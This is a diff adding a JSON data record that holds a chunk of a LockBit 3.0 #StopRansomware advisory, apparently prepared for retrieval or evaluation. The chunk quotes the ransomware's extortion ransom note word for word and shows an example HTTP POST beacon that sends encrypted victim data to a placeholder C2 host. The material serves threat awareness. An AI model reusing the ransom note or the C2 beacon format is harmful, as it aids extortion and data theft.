@@ -1,0 +1,22 @@
+{
+  "chunk_id": "AA23-075A:evaluation:llama500:19385:20727",
+  "doc_id": "AA23-075A",
+  "start": 19385,
+  "end": 20727,
+  "text": "bat\nthunderbird\nvisio\nwinword\nwordpad\nnotepad\nLockBit 3.0 Ransom Note\n~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~\n>>>>> Your data is stolen and encrypted.\nIf you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.\nNetwork Connections\nIf configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.\nExample of HTTP POST request\nPOST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate, br Content-Type: text/plain\nUser-Agent: Safari/537.36 <Lockbit User Agent String>\nHost: <Lockbit C2>\nConnection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit\nID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl\n",
+  "inherited_context": [
+    {
+      "start": 23,
+      "end": 51,
+      "text": "#StopRansomware: LockBit 3.0"
+    },
+    {
+      "start": 2048,
+      "end": 2065,
+      "text": "TECHNICAL DETAILS"
+    }
+  ],
+  "role": "extraction",
+  "parent_extraction_chunk_id": null,
+  "embedding": null
+}
